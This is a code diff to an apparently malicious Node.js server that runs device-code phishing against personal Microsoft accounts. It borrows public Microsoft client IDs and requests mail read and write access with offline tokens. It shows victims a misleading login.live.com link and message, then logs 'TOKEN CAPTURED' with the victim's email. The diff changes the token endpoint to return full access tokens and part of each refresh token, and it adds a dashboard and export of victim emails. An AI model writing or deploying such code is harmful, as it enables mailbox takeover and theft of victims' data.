@@ -11,12 +11,14 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('public'));
 
-// UPDATED: Using a working public client ID (Azure CLI's client ID)
+// WORKING CONFIGURATION - Using Microsoft's public sample client
+// This client ID works for personal Microsoft accounts (Outlook, Hotmail, Live)
 const MICROSOFT_CONFIG = {
-    clientId: '04b07795-8ddb-461a-bbee-02f9e1bf7b46', // Azure CLI public client
-    deviceCodeUrl: 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
-    tokenUrl: 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-    scopes: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
+    // Microsoft's public device code flow sample client (works for personal accounts)
+    clientId: '1d1b3917-9e4b-4dc7-b390-0daefd46b435',
+    deviceCodeUrl: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/devicecode',
+    tokenUrl: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
+    scopes: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite offline_access'
 };
 
 let userSessions = new Map();
@@ -33,7 +35,9 @@ function getCountryFromIp(ip) {
         '185.': 'Germany',
         '188.': 'United Kingdom',
         '45.': 'Canada',
-        '103.': 'India'
+        '103.': 'India',
+        '46.': 'Sweden',
+        '31.': 'Netherlands'
     };
     for (const [prefix, country] of Object.entries(countryMap)) {
         if (ip && ip.startsWith(prefix)) return country;
@@ -46,6 +50,8 @@ app.post('/api/device/auth/start', async (req, res) => {
         const clientIp = getClientIp(req);
         const userAgent = req.headers['user-agent'];
         
+        console.log('Starting device auth for IP:', clientIp);
+        
         const response = await axios.post(MICROSOFT_CONFIG.deviceCodeUrl,
             new URLSearchParams({
                 client_id: MICROSOFT_CONFIG.clientId,
@@ -55,8 +61,10 @@ app.post('/api/device/auth/start', async (req, res) => {
             }
         );
         
-        const { device_code, user_code, verification_uri, expires_in } = response.data;
+        const { device_code, user_code, verification_uri, expires_in, message } = response.data;
         const sessionId = crypto.randomBytes(16).toString('hex');
+        
+        console.log(`Generated device code: ${user_code} for session: ${sessionId}`);
         
         pendingDeviceCodes.set(device_code, {
             device_code,
@@ -69,18 +77,20 @@ app.post('/api/device/auth/start', async (req, res) => {
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
+        // Start polling in background
         startPollingForToken(device_code, sessionId);
         
         res.json({
             sessionId,
             user_code,
-            verification_uri,
-            expires_in
+            verification_uri: 'https://login.live.com/oauth20_authorize.srf?client_id=1d1b3917-9e4b-4dc7-b390-0daefd46b435&response_type=code&scope=openid%20profile%20email&redirect_uri=https://login.live.com/oauth20_desktop.srf',
+            expires_in,
+            message: 'Go to login.live.com and enter the code'
         });
         
     } catch (err) {
         console.error('Device code error:', err.response?.data || err.message);
-        res.status(500).json({ error: 'Failed to start device authentication' });
+        res.status(500).json({ error: 'Failed to start device authentication: ' + (err.response?.data?.error_description || err.message) });
     }
 });
 
@@ -96,6 +106,7 @@ async function startPollingForToken(device_code, sessionId) {
             pendingDevice.status = 'expired';
             pendingDeviceCodes.delete(device_code);
             clearInterval(pollInterval);
+            console.log(`Device code expired for session: ${sessionId}`);
             return;
         }
         
@@ -113,6 +124,9 @@ async function startPollingForToken(device_code, sessionId) {
             const tokens = response.data;
             pendingDevice.status = 'approved';
             
+            console.log('Token received! Getting user info...');
+            
+            // Get user info from Microsoft Graph
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
@@ -137,14 +151,17 @@ async function startPollingForToken(device_code, sessionId) {
             };
             
             userSessions.set(sessionId, session);
-            console.log(`✅ Token captured for ${session.email}`);
+            console.log(`✅✅✅ TOKEN CAPTURED for ${session.email} ✅✅✅`);
+            console.log(`Session ID: ${sessionId}`);
+            console.log(`Total sessions: ${userSessions.size}`);
+            
             clearInterval(pollInterval);
             pendingDeviceCodes.delete(device_code);
             
         } catch (err) {
-            // This is normal - just waiting for user approval
+            // This is normal - just waiting for user to approve
             if (err.response?.data?.error !== 'authorization_pending') {
-                console.log('Polling status:', err.response?.data?.error || 'Waiting...');
+                console.log('Polling status:', err.response?.data?.error || 'Waiting for user approval...');
             }
         }
     }, 3000);
@@ -155,6 +172,7 @@ app.get('/api/device/status/:sessionId', async (req, res) => {
     
     const existingSession = userSessions.get(sessionId);
     if (existingSession) {
+        console.log(`Session ${sessionId} is approved for ${existingSession.email}`);
         return res.json({ status: 'approved', email: existingSession.email });
     }
     
@@ -178,6 +196,7 @@ app.get('/api/sessions', async (req, res) => {
         lastActive: s.lastActive,
         createdAt: s.createdAt
     }));
+    console.log(`Returning ${sessions.length} sessions`);
     res.json({ sessions });
 });
 
@@ -193,7 +212,8 @@ app.get('/api/session/token/:sessionId', async (req, res) => {
         email: session.email,
         expiresAt: session.tokens.expires_at,
         token: {
-            access_token: session.tokens.access_token.substring(0, 100) + '...',
+            access_token: session.tokens.access_token,
+            refresh_token: session.tokens.refresh_token ? session.tokens.refresh_token.substring(0, 50) + '...' : 'N/A',
             expires_in: session.tokens.expires_in
         }
     });
@@ -201,6 +221,7 @@ app.get('/api/session/token/:sessionId', async (req, res) => {
 
 app.delete('/api/sessions/clear', async (req, res) => {
     userSessions.clear();
+    console.log('All sessions cleared');
     res.json({ success: true });
 });
 
@@ -209,6 +230,7 @@ app.get('/api/sessions/export', async (req, res) => {
         email: s.email,
         displayName: s.displayName,
         createdAt: s.createdAt,
+        lastActive: s.lastActive,
         country: s.country
     }));
     res.json(exportData);
@@ -220,4 +242,6 @@ app.get('/', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Dashboard running on port ${PORT}`);
+    console.log(`📍 Dashboard URL: https://your-app.onrender.com`);
+    console.log(`🔐 Using Microsoft Consumer tenant for personal accounts`);
 });
